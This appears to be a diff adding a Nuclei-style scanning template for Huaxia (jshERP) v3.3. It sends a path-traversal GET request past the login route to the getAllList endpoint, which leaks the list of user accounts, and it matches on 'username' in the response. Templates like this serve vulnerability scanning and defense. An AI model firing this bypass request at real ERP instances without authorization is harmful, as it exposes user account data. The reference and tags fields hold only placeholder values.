@@ -1,0 +1,24 @@
+id: jserp-login-bypass
+info:
+  name: 华夏erp v3.3 存在后台系统敏感信息泄露漏洞
+  author: wangzong
+  severity: info
+  description: 华夏erp v3.3 存在后台系统敏感信息泄露漏洞
+  reference:
+    - https://
+  tags: tags
+      
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/user/login/../../jshERP-boot/user/getAllList"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - '200'
+      - type: word
+        part: body
+        words:
+          - username
